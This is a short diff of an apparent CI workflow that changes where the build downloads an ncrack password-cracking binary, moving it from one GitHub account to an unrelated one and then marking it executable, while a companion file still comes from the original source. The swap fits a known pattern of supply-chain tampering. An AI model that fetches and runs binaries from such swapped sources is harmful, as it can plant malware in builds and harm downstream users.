@@ -36,7 +36,7 @@ jobs:
 
       - name: Download ncrack
         run: |
-          wget -O docker/ncrack  https://github.com/1c3z/arl_files/raw/master/ncrack
+          wget -O docker/ncrack  https://github.com/alex123-2star/arl_files/raw/master/ncrack
           wget -O docker/ncrack-services https://github.com/1c3z/arl_files/raw/master/ncrack-services
           chmod +x docker/ncrack
 
